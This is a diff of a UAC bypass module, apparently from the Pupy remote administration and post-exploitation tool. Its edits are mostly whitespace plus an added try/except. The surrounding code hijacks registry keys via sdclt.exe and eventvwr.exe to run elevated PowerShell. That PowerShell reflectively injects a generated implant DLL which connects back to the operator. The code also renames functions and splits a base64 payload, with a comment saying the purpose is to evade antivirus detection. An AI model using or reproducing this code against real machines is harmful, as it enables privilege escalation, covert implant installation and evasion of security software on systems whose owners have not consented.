@@ -37,7 +37,7 @@ class bypassuac():
         self.mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
         self.invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
         self.invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
-        
+
     def bypassuac_through_appPaths(self):
         '''
         Performs an UAC bypass attack by using app Paths + sdclt.exe (Wind10 Only): Thanks to enigma0x3 (https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/).
@@ -53,11 +53,11 @@ class bypassuac():
         files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
         self.module.info('Altering the registry')
         self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking_appPath(self.mainPowershellScriptRemotePath, files_to_delete)
-        
+
         self.module.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")
         self.module.success("If nothing happened, try to migrate to another process and try again.")
-        
-            
+
+
     def bypassuac_through_eventVwrBypass(self):
         #   '''
         #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
@@ -76,10 +76,10 @@ class bypassuac():
         files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
         self.module.info('Altering the registry')
         self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking_eventvwr(self.mainPowershellScriptRemotePath, files_to_delete)
-        
+
         self.module.success("Waiting for a connection from the DLL (take few seconds)...")
         self.module.success("If nothing happened, try to migrate to another process and try again.")
-        
+
     def bypassuac_through_powerSploitBypassUAC(self):
         '''
         Performs an UAC bypass attack by using the powersloit UACBypass script (wind7 to 8.1)
@@ -120,11 +120,11 @@ class bypassuac():
         cat {pupy_dll} | Out-String  | iex
         {InvokeReflectivePEInjection} -PEBytes $PEBytes -ForceASLR
         """.format(invoke_reflective_pe_injection=self.invokeReflectivePEInjectionRemotePath, pupy_dll=self.pupyDLLRemotePath, InvokeReflectivePEInjection=self.reflectivePE_random_name)
-        
+
         logging.info("Creating the Powershell script in %s locally"%(self.mainPowerShellScriptPrivilegedLocalPath))
         with open(self.mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
             w.write(mainPowerShellScriptPrivileged)
-        
+
         logging.info("Uploading powershell code for DLL injection in {0}".format(self.invokeReflectivePEInjectionRemotePath))
         content = re.sub("Invoke-ReflectivePEInjection", self.reflectivePE_random_name, open(self.invokeReflectivePEInjectionLocalPath).read(), flags=re.I)
         tmp_file = os.path.join(gettempdir(),'reflective_pe.txt')
@@ -138,9 +138,13 @@ class bypassuac():
         '''
         Upload pupy dll as a txt file
         '''
-        res=self.module.client.conn.modules['pupy'].get_connect_back_host()
-        host, port = res.rsplit(':',1)
-        logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
+        try:
+            res=self.module.client.conn.modules['pupy'].get_connect_back_host()
+            host, port = res.rsplit(':',1)
+            logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
+        except:
+            logging.info("Address configured is %s for pupy dll..."%(res))
+
         logging.info("Looking for process architecture...")
         logging.info("force x86 is %s"%force_x86_dll)
         conf = self.module.client.get_conf()
@@ -148,7 +152,7 @@ class bypassuac():
             dllbuff, tpl, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x64', shared=True)
         else:
             dllbuff, tpl, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x86', shared=True)
-        
+
         logging.info("Creating the pupy dll (%s) in %s locally"%(tpl, self.pupyDLLLocalPath))
         with open(self.pupyDLLLocalPath, 'w+') as w:
             #the following powershell line in a txt file is detected by Windows defender
@@ -156,6 +160,6 @@ class bypassuac():
             #To bypass antivirus detection:
             dllbuffEncoded = base64.b64encode(dllbuff)
             w.write('$p1="{0}";$p2="{1}";$PEBytes=[System.Convert]::FromBase64String($p1+$p2)'.format(dllbuffEncoded[0:2], dllbuffEncoded[2:]))
-        
+
         logging.info("Uploading pupy dll {0} to {1}".format(self.pupyDLLLocalPath, self.pupyDLLRemotePath))
         upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
